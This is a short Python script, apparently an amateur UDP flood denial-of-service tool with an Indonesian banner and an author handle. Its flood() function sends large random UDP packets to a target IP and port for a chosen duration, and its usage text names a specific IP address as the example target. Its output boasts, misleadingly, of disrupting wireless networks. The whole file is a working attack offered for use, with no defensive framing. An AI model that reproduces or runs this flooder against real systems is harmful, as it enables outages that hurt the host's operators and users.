import os
import time
import socket
import random
import sys
os.system("clear")
def usage():
	print ("===///====///===///====///===///==//")
	print ("-Welcome to kill of wireless")
	print ("___•••____•••___••___•••__")
	print ("-Author : mister cobain.jr")
	print ("(masukan perintah python Leader4.py 194.5.159.78 80 1000)-")
	print ("")
	print ("-Scripting succesfuly")
	print ("")
	       
def flood(victim, vport, duration):
	client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	bytes = random._urandom(20000)
	timeout = time.time() + duration
	sent = 3000
	
	while 1:
		if time.time() > timeout:
			break
		else:
			pass
		client.sendto(bytes, (victim, vport))
		sent = sent + 1
		print ("berhasil memutus jaringan wifi && brhasil merusak jaringan wireless!!!")
def main():
	
	if len(sys.argv) != 4:
		usage()
	else:
		flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
		
if __name__ == '__main__':
	main()
